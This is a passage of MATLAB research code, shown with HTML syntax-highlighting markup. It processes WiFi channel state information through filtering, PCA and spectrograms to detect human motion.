    <span class="token string">'P3-A1-I2-G1'</span><span class="token punctuation">,</span><span class="token string">'P3-A1-I2-G2'</span><span class="token punctuation">,</span><span class="token string">'P3-A1-I2-G3'</span><span class="token punctuation">,</span><span class="token string">'P3-A1-I2-G4'</span><span class="token punctuation">,</span> <span class="token punctuation">...</span>
    <span class="token string">'P4-A1-I2-G1'</span><span class="token punctuation">,</span><span class="token string">'P4-A1-I2-G2'</span><span class="token punctuation">,</span><span class="token string">'P4-A1-I2-G3'</span><span class="token punctuation">,</span><span class="token string">'P4-A1-I2-G4'</span><span class="token punctuation">,</span> <span class="token punctuation">...</span>
    <span class="token string">'P5-A1-I2-G1'</span><span class="token punctuation">,</span><span class="token string">'P5-A1-I2-G2'</span><span class="token punctuation">,</span><span class="token string">'P5-A1-I2-G3'</span><span class="token punctuation">,</span><span class="token string">'P5-A1-I2-G4'</span><span class="token punctuation">,</span> <span class="token punctuation">...</span>
    <span class="token string">'P1-A2-I2-G1'</span><span class="token punctuation">,</span><span class="token string">'P1-A2-I2-G2'</span><span class="token punctuation">,</span><span class="token string">'P1-A2-I2-G3'</span><span class="token punctuation">,</span><span class="token string">'P1-A2-I2-G4'</span><span class="token punctuation">,</span> <span class="token punctuation">...</span>
    <span class="token string">'P1-A3-I2-G2'</span><span class="token punctuation">,</span><span class="token string">'P1-A3-I2-G3'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">%% Data Processing.</span>
carr_freq <span class="token operator">=</span> <span class="token number">5.825e9</span><span class="token punctuation">;</span>
wave_spee <span class="token operator">=</span> <span class="token number">299792458</span><span class="token punctuation">;</span>
n_subc <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span>
n_ante <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
wave_leng <span class="token operator">=</span> wave_spee <span class="token operator">/</span> carr_freq<span class="token punctuation">;</span>
n_note <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>
all_tant <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
all_mark <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
all_dire <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
all_resu <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
confusion <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
type_summ <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> ll <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>prefix_list<span class="token punctuation">)</span><span class="token punctuation">,</span>
    note_inte <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    prefix <span class="token operator">=</span> prefix_list<span class="token punctuation">{</span>ll<span class="token punctuation">}</span><span class="token punctuation">;</span>

    file_path_list <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>data_path<span class="token punctuation">,</span> <span class="token string">'R1-'</span><span class="token punctuation">,</span>prefix<span class="token punctuation">,</span><span class="token string">'.dat'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>data_path<span class="token punctuation">,</span> <span class="token string">'R2-'</span><span class="token punctuation">,</span>prefix<span class="token punctuation">,</span><span class="token string">'.dat'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    ground_truth_path <span class="token operator">=</span> <span class="token punctuation">[</span>data_path<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> <span class="token string">'.mat'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    save_path <span class="token operator">=</span> <span class="token punctuation">[</span>data_path<span class="token punctuation">,</span> <span class="token string">'MED-'</span><span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> <span class="token string">'.mat'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    ground_truth <span class="token operator">=</span> <span class="token function">load</span><span class="token punctuation">(</span>ground_truth_path<span class="token punctuation">,</span> <span class="token string">'mark_list'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    mark_list <span class="token operator">=</span> ground_truth<span class="token punctuation">.</span>mark_list<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token operator">~</span><span class="token function">exist</span><span class="token punctuation">(</span>save_path<span class="token punctuation">)</span><span class="token punctuation">,</span>
        chan_data_list <span class="token operator">=</span> <span class="token function">cell</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> kk <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">,</span>
            file_path <span class="token operator">=</span> file_path_list<span class="token punctuation">{</span>kk<span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token punctuation">[</span>chan_data<span class="token punctuation">,</span> time_stam<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">csi_get_all</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> kk <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span>
<span class="token comment" spellcheck="true">%                 samp_rate = length(time_stam) / (time_stam(end)-time_stam(1)) * 1e6;</span>
<span class="token comment" spellcheck="true">%                 samp_rate = 2^(round(log2(samp_rate)));</span>
                samp_rate <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>
                n_data <span class="token operator">=</span> <span class="token function">size</span><span class="token punctuation">(</span>chan_data<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">elseif</span> n_data <span class="token operator">></span> <span class="token function">size</span><span class="token punctuation">(</span>chan_data<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                n_data <span class="token operator">=</span> <span class="token function">size</span><span class="token punctuation">(</span>chan_data<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">end</span>
            chan_data_list<span class="token punctuation">{</span>kk<span class="token punctuation">}</span> <span class="token operator">=</span> chan_data<span class="token punctuation">;</span>
        <span class="token keyword">end</span>

        <span class="token comment" spellcheck="true">%% Set up filters.</span>
        half_rate <span class="token operator">=</span> samp_rate <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
        uppe_orde <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
        uppe_stop <span class="token operator">=</span> <span class="token number">40</span><span class="token punctuation">;</span>
        lowe_orde <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        lowe_stop <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
        <span class="token punctuation">[</span>lu<span class="token punctuation">,</span>ld<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">butter</span><span class="token punctuation">(</span>uppe_orde<span class="token punctuation">,</span>uppe_stop<span class="token operator">/</span>half_rate<span class="token punctuation">,</span><span class="token string">'low'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">[</span>hu<span class="token punctuation">,</span>hd<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">butter</span><span class="token punctuation">(</span>lowe_orde<span class="token punctuation">,</span>lowe_stop<span class="token operator">/</span>half_rate<span class="token punctuation">,</span><span class="token string">'high'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        data_wind <span class="token operator">=</span> samp_rate <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>
        iter_star <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>samp_rate<span class="token operator">:</span>n_data<span class="token operator">-</span>data_wind<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
        freq_bins <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span>samp_rate<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>samp_rate<span class="token operator">/</span><span class="token number">2</span><span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">'</span><span class="token operator">/</span>samp_rate<span class="token punctuation">;</span>
        time_bins <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>iter_star<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0.5</span><span class="token operator">*</span>data_wind<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> samp_rate<span class="token punctuation">;</span>
        freq_sele <span class="token operator">=</span> freq_bins <span class="token operator">&lt;=</span> uppe_stop <span class="token operator">/</span> samp_rate <span class="token operator">&amp;</span> freq_bins <span class="token operator">>=</span> <span class="token operator">-</span>uppe_stop <span class="token operator">/</span> samp_rate<span class="token punctuation">;</span>
        freq_bins <span class="token operator">=</span> <span class="token function">freq_bins</span><span class="token punctuation">(</span>freq_sele<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         powe_freq_sele = freq_bins >= 0 &amp; freq_bins &lt;= uppe_stop / samp_rate;</span>
<span class="token comment" spellcheck="true">%         powe_freq_bins = freq_bins(powe_freq_sele,:);</span>
        freq_time_prof <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>freq_bins<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">length</span><span class="token punctuation">(</span>time_bins<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         powe_freq_time_prof = zeros(length(powe_freq_bins), length(time_bins),length(file_path_list));</span>

        <span class="token keyword">for</span> kk <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">,</span>
           <span class="token comment" spellcheck="true">%% Processing data streams.</span>
            chan_data <span class="token operator">=</span> chan_data_list<span class="token punctuation">{</span>kk<span class="token punctuation">}</span><span class="token punctuation">;</span>
            chan_powe <span class="token operator">=</span> chan_data <span class="token operator">.*</span> <span class="token function">conj</span><span class="token punctuation">(</span>chan_data<span class="token punctuation">)</span><span class="token punctuation">;</span>
            ante_pairs <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token function">length</span><span class="token punctuation">(</span>iter_star<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> ii <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>iter_star<span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment" spellcheck="true">%% Select antenna pair.</span>
                part_data <span class="token operator">=</span> <span class="token function">chan_data</span><span class="token punctuation">(</span><span class="token function">iter_star</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">iter_star</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token operator">+</span>data_wind<span class="token number">-1</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_powe <span class="token operator">=</span> <span class="token function">chan_powe</span><span class="token punctuation">(</span><span class="token function">iter_star</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">iter_star</span><span class="token punctuation">(</span>ii<span class="token punctuation">)</span><span class="token operator">+</span>data_wind<span class="token number">-1</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_vari <span class="token operator">=</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token function">var</span><span class="token punctuation">(</span>part_powe<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_mean <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>part_powe<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_vari_ante <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span><span class="token function">reshape</span><span class="token punctuation">(</span>part_vari<span class="token operator">.'</span><span class="token punctuation">,</span> n_subc<span class="token punctuation">,</span> n_ante<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_mean_ante <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span><span class="token function">reshape</span><span class="token punctuation">(</span>part_mean<span class="token operator">.'</span><span class="token punctuation">,</span> n_subc<span class="token punctuation">,</span> n_ante<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_indi_ante <span class="token operator">=</span> part_mean_ante <span class="token operator">./</span> part_vari_ante<span class="token punctuation">;</span>
                <span class="token punctuation">[</span><span class="token operator">~</span><span class="token punctuation">,</span> maxi<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>part_indi_ante<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">[</span><span class="token operator">~</span><span class="token punctuation">,</span> mini<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>part_indi_ante<span class="token punctuation">)</span><span class="token punctuation">;</span>
                ante_pair <span class="token operator">=</span> <span class="token punctuation">[</span>mini<span class="token punctuation">,</span> maxi<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token function">ante_pairs</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>ii<span class="token punctuation">)</span> <span class="token operator">=</span> ante_pair<span class="token operator">.'</span><span class="token punctuation">;</span>
                part_diff <span class="token operator">=</span> <span class="token function">part_data</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">ante_pair</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>n_subc<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">ante_pair</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>n_subc<span class="token punctuation">)</span> <span class="token punctuation">...</span>
                    <span class="token operator">.*</span> <span class="token function">conj</span><span class="token punctuation">(</span><span class="token function">part_data</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">ante_pair</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>n_subc<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">ante_pair</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span>n_subc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token comment" spellcheck="true">%% Filter out noises and interferences.</span>
                <span class="token keyword">for</span> jj <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>n_subc<span class="token punctuation">,</span>
                    <span class="token function">part_diff</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>jj<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span>lu<span class="token punctuation">,</span> ld<span class="token punctuation">,</span> <span class="token function">part_diff</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>jj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token function">part_diff</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>jj<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span>hu<span class="token punctuation">,</span> hd<span class="token punctuation">,</span> <span class="token function">part_diff</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>jj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">end</span>
<span class="token comment" spellcheck="true">%                 for jj = 1:n_subc*3,</span>
<span class="token comment" spellcheck="true">%                     part_powe(:,jj) = filter(lu, ld, part_powe(:,jj));</span>
<span class="token comment" spellcheck="true">%                     part_powe(:,jj) = filter(hu, hd, part_powe(:,jj));</span>
<span class="token comment" spellcheck="true">%                 end</span>

               <span class="token comment" spellcheck="true">%% PCA analysis.</span>
                pca_coef <span class="token operator">=</span> <span class="token function">pca</span><span class="token punctuation">(</span>part_diff<span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_diff <span class="token operator">=</span> part_diff <span class="token operator">*</span> <span class="token function">pca_coef</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_wind <span class="token operator">=</span> <span class="token function">floor</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token operator">*</span>samp_rate<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">1.5</span><span class="token operator">*</span>samp_rate<span class="token punctuation">)</span><span class="token punctuation">;</span>
                part_spec <span class="token operator">=</span> <span class="token function">tfrsp</span><span class="token punctuation">(</span>part_diff<span class="token punctuation">,</span> part_wind<span class="token punctuation">,</span> samp_rate<span class="token punctuation">,</span> <span class="token function">tftb_window</span><span class="token punctuation">(</span>samp_rate<span class="token operator">/</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'gauss'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token punctuation">(</span>ii<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span>samp_rate<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>ii<span class="token operator">*</span>samp_rate<span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">part_spec</span><span class="token punctuation">(</span>freq_sele<span class="token punctuation">,</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">%                 powe_pca_coef = pca(part_powe);</span>
<span class="token comment" spellcheck="true">%                 part_powe = part_powe * powe_pca_coef(:,1);</span>
<span class="token comment" spellcheck="true">%                 powe_part_spec = tfrsp(part_powe, part_wind, samp_rate, tftb_window(samp_rate/8+1, </span><span class="token string">'gauss'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%                 powe_freq_time_prof(:,(ii-1)*samp_rate+1:ii*samp_rate,kk) = powe_part_spec(powe_freq_sele, :);</span>
            <span class="token keyword">end</span>
            <span class="token function">freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%             powe_freq_time_prof(:,:,kk) = abs(powe_freq_time_prof(:,:,kk));</span>
        <span class="token keyword">end</span>
        <span class="token function">save</span><span class="token punctuation">(</span>save_path<span class="token punctuation">,</span> <span class="token string">'freq_time_prof'</span><span class="token punctuation">,</span> <span class="token string">'powe_freq_time_prof'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token function">load</span><span class="token punctuation">(</span>save_path<span class="token punctuation">)</span><span class="token punctuation">;</span>
        samp_rate <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>
        uppe_stop <span class="token operator">=</span> <span class="token number">40</span><span class="token punctuation">;</span>
        freq_bins <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span>samp_rate<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>samp_rate<span class="token operator">/</span><span class="token number">2</span><span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">'</span><span class="token operator">/</span>samp_rate<span class="token punctuation">;</span>
        freq_sele <span class="token operator">=</span> freq_bins <span class="token operator">&lt;=</span> uppe_stop <span class="token operator">/</span> samp_rate <span class="token operator">&amp;</span> freq_bins <span class="token operator">>=</span> <span class="token operator">-</span>uppe_stop <span class="token operator">/</span> samp_rate<span class="token punctuation">;</span>
        freq_bins <span class="token operator">=</span> <span class="token function">freq_bins</span><span class="token punctuation">(</span>freq_sele<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         powe_freq_sele = freq_bins &lt;= uppe_stop / samp_rate &amp; freq_bins >= 0;</span>
<span class="token comment" spellcheck="true">%         powe_freq_bins = freq_bins(powe_freq_sele);</span>
        time_bins <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">:</span><span class="token function">size</span><span class="token punctuation">(</span>freq_time_prof<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span>samp_rate<span class="token punctuation">;</span>
    <span class="token keyword">end</span>

    prof_cent <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>time_bins<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    prof_vari <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>time_bins<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    prof_ener <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>time_bins<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%     powe_cent = zeros(length(time_bins),length(file_path_list));</span>
    norm_freq_time_prof <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">size</span><span class="token punctuation">(</span>freq_time_prof<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%     norm_powe_freq_time_prof = zeros(size(powe_freq_time_prof));</span>

    <span class="token keyword">for</span> kk <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>file_path_list<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">norm_freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">./</span> <span class="token function">repmat</span><span class="token punctuation">(</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token function">freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         norm_powe_freq_time_prof(:,:,kk) = abs(powe_freq_time_prof(:,:,kk)) ./ repmat(sum(abs(powe_freq_time_prof(:,:,kk)),1), size(powe_freq_time_prof(:,:,kk),1), 1);</span>
        <span class="token function">prof_cent</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> freq_bins<span class="token operator">.'</span> <span class="token operator">*</span> <span class="token function">norm_freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">%         powe_cent(:,kk) = powe_freq_bins.' * norm_powe_freq_time_prof(:,:,kk);</span>

        <span class="token function">prof_vari</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">repmat</span><span class="token punctuation">(</span>freq_bins<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">length</span><span class="token punctuation">(</span>time_bins<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">repmat</span><span class="token punctuation">(</span><span class="token function">prof_cent</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token operator">.'</span><span class="token punctuation">,</span> <span class="token function">length</span><span class="token punctuation">(</span>freq_bins<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.^</span><span class="token number">2</span> <span class="token punctuation">...</span>
            <span class="token operator">.*</span> <span class="token function">norm_freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">prof_ener</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">smooth</span><span class="token punctuation">(</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">freq_time_prof</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span>kk<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> samp_rate<span class="token operator">/</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'moving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">end</span>

    <span class="token comment" spellcheck="true">%% Motion Detection...</span>
    moti_indi <span class="token operator">=</span> <span class="token function">smooth</span><span class="token punctuation">(</span><span class="token function">mean</span><span class="token punctuation">(</span>prof_vari<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>samp_rate<span class="token operator">/</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'moving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    dete_thre <span class="token operator">=</span> <span class="token number">0.015</span><span class="token punctuation">;</span>
    time_thre <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0.25</span><span class="token punctuation">,</span> <span class="token number">0.25</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    moti_valu <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    moti_inde <span class="token operator">=</span> moti_indi <span class="token operator">&lt;</span> dete_thre<span class="token punctuation">;</span>

